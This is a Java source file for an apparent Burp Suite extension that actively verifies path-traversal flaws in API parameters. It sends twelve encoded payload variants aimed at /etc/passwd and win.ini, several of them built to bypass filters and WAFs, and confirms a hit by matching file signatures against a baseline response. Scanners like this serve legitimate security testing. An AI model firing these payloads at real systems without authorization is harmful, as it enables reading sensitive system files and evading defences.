package com.flechazo.apisentinel.detection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.flechazo.apisentinel.logging.LeveledLogger;
import com.flechazo.apisentinel.model.ApiEntry;
import com.flechazo.apisentinel.util.HttpMessageUtils;

import java.util.List;

/** 路径穿越验证器——12 种编码变体 + 基线对比，程序化判定。 */
public class PathTraversalVerifier {

    public record TraversalPayload(String payload, String technique, String os) {}

    private static final List<TraversalPayload> LINUX_PAYLOADS = List.of(
            new TraversalPayload("../../etc/passwd", "direct", "linux"),
            new TraversalPayload("....//....//etc/passwd", "double-dot-strip-bypass", "linux"),
            new TraversalPayload("..%2f..%2fetc%2fpasswd", "url-encoded-slash", "linux"),
            new TraversalPayload("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "full-encoding", "linux"),
            new TraversalPayload("..%252f..%252fetc%252fpasswd", "double-encoding", "linux"),
            new TraversalPayload("..%c0%af..%c0%afetc/passwd", "utf8-overlong", "linux"),
            new TraversalPayload("/etc/passwd", "absolute-path", "linux"),
            new TraversalPayload("....\\....\\etc\\passwd", "backslash-variant", "linux")
    );

    private static final List<TraversalPayload> WINDOWS_PAYLOADS = List.of(
            new TraversalPayload("..\\..\\windows\\win.ini", "direct-backslash", "windows"),
            new TraversalPayload("....\\\\....\\\\windows\\\\win.ini", "double-backslash-bypass", "windows"),
            new TraversalPayload("..%5c..%5cwindows%5cwin.ini", "url-encoded-backslash", "windows"),
            new TraversalPayload("C:\\windows\\win.ini", "absolute-path", "windows")
    );

    private static final String[] LINUX_SIGNATURES = {"root:x:0:0:", "root:*:0:0:"};
    private static final String[] WINDOWS_SIGNATURES = {"[fonts]", "[extensions]", "[mci extensions]"};

    public record PathTraversalResult(
            boolean confirmed,
            String payload,
            String technique,
            String evidenceSnippet,
            boolean wafBlocked,
            String detail,
            String sentRequest,
            String receivedResponse,
            int statusCode,
            long elapsedMs
    ) {
        public static PathTraversalResult notConfirmed(String detail) {
            return new PathTraversalResult(false, null, null, null, false, detail, null, null, 0, 0);
        }
    }

    private final MontoyaApi api;
    private final LeveledLogger logger;
    private final WafDetector wafDetector;
    private final boolean wafDetectionEnabled;

    public PathTraversalVerifier(MontoyaApi api, LeveledLogger logger, boolean wafDetectionEnabled) {
        this.api = api;
        this.logger = logger;
        this.wafDetector = new WafDetector(logger);
        this.wafDetectionEnabled = wafDetectionEnabled;
    }

    public PathTraversalResult verify(ApiEntry entry, String paramName,
                                      String paramLocation, String paramValue,
                                      String targetOs) {
        String raw = entry.getLastRawRequest();
        if (raw == null || raw.isEmpty()) {
            return PathTraversalResult.notConfirmed("无捕获请求，无法验证");
        }

        // Get baseline response to check for pre-existing signatures
        String baselineBody = "";
        Probe baseline = send(entry, raw);
        if (baseline != null) {
            baselineBody = HttpMessageUtils.bodyOf(baseline.rawResponse);
        }

        boolean tryLinux = targetOs == null || targetOs.isBlank()
                || "auto".equalsIgnoreCase(targetOs) || "linux".equalsIgnoreCase(targetOs);
        boolean tryWindows = targetOs == null || targetOs.isBlank()
                || "auto".equalsIgnoreCase(targetOs) || "windows".equalsIgnoreCase(targetOs);

        int wafBlocked = 0;
        int attempted = 0;

        if (tryLinux) {
            for (TraversalPayload tp : LINUX_PAYLOADS) {
                if (attempted >= 8) break;
                PathTraversalResult r = tryPayload(entry, raw, paramName, paramLocation,
                        tp, LINUX_SIGNATURES, baselineBody);
                attempted++;
                if (r != null) {
                    if (r.wafBlocked()) { wafBlocked++; continue; }
                    if (r.confirmed()) return r;
                }
            }
        }

        if (tryWindows) {
            for (TraversalPayload tp : WINDOWS_PAYLOADS) {
                if (attempted >= 12) break;
                PathTraversalResult r = tryPayload(entry, raw, paramName, paramLocation,
                        tp, WINDOWS_SIGNATURES, baselineBody);
                attempted++;
                if (r != null) {
                    if (r.wafBlocked()) { wafBlocked++; continue; }
                    if (r.confirmed()) return r;
                }
            }
        }

        if (wafBlocked > 0 && wafBlocked >= attempted) {
            return new PathTraversalResult(false, null, null, null, true,
                    attempted + " 种穿越 payload 全被 WAF 拦截", null, null, 0, 0);
        }
        return PathTraversalResult.notConfirmed(
                "已测试 " + attempted + " 种路径穿越 payload，响应中未发现文件内容特征");
    }

    private PathTraversalResult tryPayload(ApiEntry entry, String raw, String paramName,
                                           String paramLocation, TraversalPayload tp,
                                           String[] signatures, String baselineBody) {
        String mutated = BlindParamMutator.mutate(raw, paramName, paramLocation, tp.payload());
        if (mutated == null) return null;

        Probe probe = send(entry, mutated);
        if (probe == null) return null;

        if (isWafBlocked(probe)) {
            return new PathTraversalResult(false, tp.payload(), tp.technique(), null, true,
                    "WAF 拦截", probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
        }

        String body = HttpMessageUtils.bodyOf(probe.rawResponse);
        for (String sig : signatures) {
            if (body.contains(sig) && !baselineBody.contains(sig)) {
                int idx = body.indexOf(sig);
                String snippet = body.substring(idx, Math.min(idx + 80, body.length()));
                String detail = "路径穿越确认: " + tp.payload() + " → 响应含 \"" + sig
                        + "\" [technique: " + tp.technique() + "]";
                if (logger != null) {
                    logger.info("[PathTraversal] %s 参数 %s %s", entry.getApiPath(), paramName, detail);
                }
                return new PathTraversalResult(true, tp.payload(), tp.technique(), snippet, false,
                        detail, probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
            }
        }
        return null;
    }

    public static boolean containsFileSignature(String responseBody) {
        if (responseBody == null) return false;
        for (String sig : LINUX_SIGNATURES) {
            if (responseBody.contains(sig)) return true;
        }
        for (String sig : WINDOWS_SIGNATURES) {
            if (responseBody.contains(sig)) return true;
        }
        return false;
    }

    private boolean isWafBlocked(Probe p) {
        if (!wafDetectionEnabled) return false;
        return wafDetector.detect(p.rawResponse, p.status, p.elapsed).isBlocked();
    }

    private Probe send(ApiEntry entry, String rawRequest) {
        try {
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(HttpRequest.httpRequest(
                    ActiveProbeExecutor.resolveService(entry), rawRequest));
            long elapsed = System.currentTimeMillis() - start;
            int status = rr.response() != null ? rr.response().statusCode() : 0;
            String rawResp = rr.response() != null ? rr.response().toString() : "";
            return new Probe(rawRequest, rawResp, status, elapsed);
        } catch (Exception e) {
            if (logger != null) logger.warn("[PathTraversal] 请求失败: %s", e.getMessage());
            return null;
        }
    }

    private static final class Probe {
        final String rawRequest;
        final String rawResponse;
        final int status;
        final long elapsed;
        Probe(String rawRequest, String rawResponse, int status, long elapsed) {
            this.rawRequest = rawRequest;
            this.rawResponse = rawResponse;
            this.status = status;
            this.elapsed = elapsed;
        }
    }
}
